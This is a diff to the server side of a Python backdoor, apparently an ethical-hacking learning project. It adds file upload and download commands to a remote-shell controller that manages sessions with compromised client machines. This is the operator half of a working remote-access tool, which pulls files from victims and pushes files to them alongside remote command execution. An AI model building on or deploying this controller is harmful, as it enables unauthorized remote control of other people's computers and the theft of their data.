@@ -1,4 +1,3 @@
-import subprocess
 import socket
 import threading
 import json
@@ -38,6 +37,58 @@ class Server:
         self.current_Client = None
         self.stop_event = threading.Event()
         self.byt = 1024 * 10
+
+    # DOWNLOAD FILE
+    def download(self, file_name):
+        try:
+            if file_name == "":
+                print("[+] No filename provided to download")
+                return
+            # read file content
+            filecontent = self.receive_Message(
+                self.ip_to_socket_map[self.current_Client]
+            )
+
+            fd = open(
+                "D:\\PROJECTS\\PythonSockets\\ETH\BackDoor\\backdoor_v1\\Server\\Data\\"
+                + file_name,
+                "wb",
+            )
+            fd.write(filecontent.encode())
+            print(f"[+]File Downloaded Check {file_name} For Content")
+            fd.close()
+        except Exception as ex:
+            print(f"[-]Download error {str(ex)}")
+
+    def upload(self, filepath):
+        try:
+            if filepath == "":
+                print("[-]Please provide correct path")
+                return
+            arr = filepath.split("\\")
+            print(arr)
+            if len(filepath) == 0:
+                print("[-]Please provide correct path")
+                return
+
+            fd = open(filepath, "rb")
+            # extract the filename
+            filename = arr[len(arr) - 1]
+            # send the filename to be downloaded
+            self.send_Message(
+                self.ip_to_socket_map[self.current_Client],
+                "upload " + filename,
+                self.current_Client,
+            )
+
+            content = fd.read().decode()
+            # send the content
+            self.send_Message(
+                self.ip_to_socket_map[self.current_Client], content, self.current_Client
+            )
+            print(f"[+] Done Uploading..")
+        except Exception as ex:
+            print(f"[+]Error while uploading {str(ex)}")
 
     # REMOVE SESSION
     def remove_Session(self):
@@ -87,15 +138,30 @@ class Server:
                 # getting the user command
                 print(f"Shell~{self.current_Client}:> ", end="")
                 command = (input()).strip()
+                # logic to handle command
+                print(f"[+] Command executed :{command}")
 
                 if command.lower() == "sudo su":
                     continue
 
                 if command.strip() == "":
                     continue
-
-                # logic to handle command
-                print(command)
+                # upload
+                if command[0:6] == "upload":
+                    self.upload(command[9:])
+                    continue
+                # download command
+                if command[0:8] == "download":
+                    if command[9:].strip() == "":
+                        print(f"[+] No file name provided to download")
+                        continue
+                    self.send_Message(
+                        self.ip_to_socket_map[self.current_Client],
+                        command,
+                        self.current_Client,
+                    )
+                    self.download(command[9:])
+                    continue
                 # DISPLAY SESSIONS
                 if command.lower() == "show session":
                     # show avaiable sessions
@@ -145,6 +211,7 @@ class Server:
                     command,
                     self.current_Client,
                 )
+                print("[+] Response Received:")
                 result = self.receive_Message(
                     self.ip_to_socket_map[self.current_Client]
                 )
@@ -216,6 +283,7 @@ class Server:
                 self.control_Thread = None
                 self.current_Client = None
                 logterminal.write(f"[+] NO ACTIVE SESSIONS")
+                print(f"[+] NO Active session")
                 print_thread_count()
 
     # received_Message
